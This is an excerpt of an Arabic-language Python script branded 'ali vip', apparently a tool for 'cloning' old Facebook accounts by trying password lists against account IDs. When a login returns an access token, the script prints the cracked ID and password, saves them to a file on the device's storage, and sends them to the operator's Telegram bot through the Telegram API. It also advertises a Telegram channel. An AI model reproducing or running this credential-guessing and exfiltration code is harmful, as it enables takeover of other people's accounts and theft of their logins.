...
print('  ادخل ايدي بوتك');ID=input('[⊰⊱]  ID : ');rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= تم تشغيل اداه سوف يتم ارسال الصيد يرجى الاشتراك بل قناه https://t.me/p33_9 ❳  \n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉').text
...
try:
    ...
    os.system('pip install requests bs4 futures==2 > /dev/null')
logo=(f"""\033[1;92m┌━━━━━━━━━━━━━━━━━━\x1b[37;5;208m⊱\033[34;1m   \x1b[37;5;208m⊰\x1b[32;5;208m━━━━━━━━━━━━━━━━━━┐
    _   _   _   _     _   _   _   _   _   _
   / \ / \ / \ / \   / \ / \ / \ / \ / \ / \\
  \033[97;1m( A | L| i |   ) (  V| I  | P |  )
   \033[92;1m\_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/\n\n\033[1;92m└━━━━━━━━━━━━━━━━━━\x1b[37;5;208m⊱\033[34;1m   \x1b[37;5;208m⊰\x1b[32;5;208m━━━━━━━━━━━━━━━━━━┘    \t\n\033[1;92m┣\033[1;90m┣\033[1;91m\033[47m  ali vip  \033[00m\033[1;90m┣\033[1;92m┣\033[1;92m┫\033[1;90m┣\033[1;91m\033[47m  ali vip  \033[00m\033[1;90m┣\033[1;92m┣\033[1;92m┫\033[1;90m┣\033[1;91m\033[47m    @YAALI_515    \033[00m\033[1;90m┣\033[1;92m┫ """)
def line():
...
class AMIR_ALSYRI:
    ...
    def main(self):
        self.banner()
        line()
        print(f'    هلا وغلا حبيبي نورت اداة المطور VIP  ')
        line()
    ...
    def oldClone(self,series):
        ...
        line();print(f'\x1b[1;92m {XX}[\x1b[1;92m√{XX}]\x1b[38;5;46m EXAMPLE : {G}2000  {G}3000  {G}4000 {G}5000');line()
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r{XX}[{G}  DEVEN >{XX}]{G}  {self.loop}  {XX}[{G}OK{XX}]{G}  {len(self.oks)}")
        sys.stdout.flush()
        ...
        try:
            for pas in passlist:
                ...
                if "access_token" in response:
                    print(f"\r\r{XX}[{G}ali vip-OK{XX}]{G} ~ {ids} ~ {pas}")
                    tlg = f'''❲ OK - VIP جابلك حساب ❳\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
...
BY❲ https://t.me/p33_9❳
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                    open("/sdcard/ali vip-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                else:continue
            self.loop += 1
